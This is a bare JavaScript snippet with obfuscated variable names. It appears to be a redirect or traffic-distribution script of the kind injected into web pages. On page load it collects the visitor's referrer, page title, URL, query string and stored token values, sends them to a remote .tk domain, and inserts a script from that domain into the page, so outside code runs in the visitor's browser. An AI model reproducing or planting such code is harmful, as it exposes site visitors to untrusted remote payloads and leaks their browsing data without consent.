 (function() {
    var name = '_6jM2WLWQ3HZ6yh7t';
    if (!window._6jM2WLWQ3HZ6yh7t) {
        window._6jM2WLWQ3HZ6yh7t = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://whiranjafusboooo.tk/BRcd6v',
            P_PATH: 'https://whiranjafusboooo.tk/fec84ce/postback',
        };
    }
    const _kMjxvpYJJYVTh9m1 = localStorage.getItem('config');
    if (typeof _kMjxvpYJJYVTh9m1 !== 'undefined' && _kMjxvpYJJYVTh9m1 !== null) {
        var _Vh6ZS6NCDQcgm7bq = JSON.parse(_kMjxvpYJJYVTh9m1);
        var _KQGqwWNgkhZ7CZyC = Math.round(+new Date()/1000);
        if (_Vh6ZS6NCDQcgm7bq.created_at + window._6jM2WLWQ3HZ6yh7t.ttl < _KQGqwWNgkhZ7CZyC) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _HkmhPRJwBmcdjC2G = localStorage.getItem('subId');
    var _BrXxTvwbRkgyGDPp = localStorage.getItem('token');
    var _1yttxPCRvrMSmZHW = '?return=js.client';
        _1yttxPCRvrMSmZHW += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _1yttxPCRvrMSmZHW += '&se_referrer=' + encodeURIComponent(document.referrer);
        _1yttxPCRvrMSmZHW += '&default_keyword=' + encodeURIComponent(document.title);
        _1yttxPCRvrMSmZHW += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _1yttxPCRvrMSmZHW += '&name=' + encodeURIComponent(name);
        _1yttxPCRvrMSmZHW += '&host=' + encodeURIComponent(window._6jM2WLWQ3HZ6yh7t.R_PATH);
    if (typeof _HkmhPRJwBmcdjC2G !== 'undefined' && _HkmhPRJwBmcdjC2G && window._6jM2WLWQ3HZ6yh7t.unique) {
        _1yttxPCRvrMSmZHW += '&sub_id=' + encodeURIComponent(_HkmhPRJwBmcdjC2G);
    }
    if (typeof _BrXxTvwbRkgyGDPp !== 'undefined' && _BrXxTvwbRkgyGDPp && window._6jM2WLWQ3HZ6yh7t.unique) {
        _1yttxPCRvrMSmZHW += '&token=' + encodeURIComponent(_BrXxTvwbRkgyGDPp);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._6jM2WLWQ3HZ6yh7t.R_PATH + _1yttxPCRvrMSmZHW;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
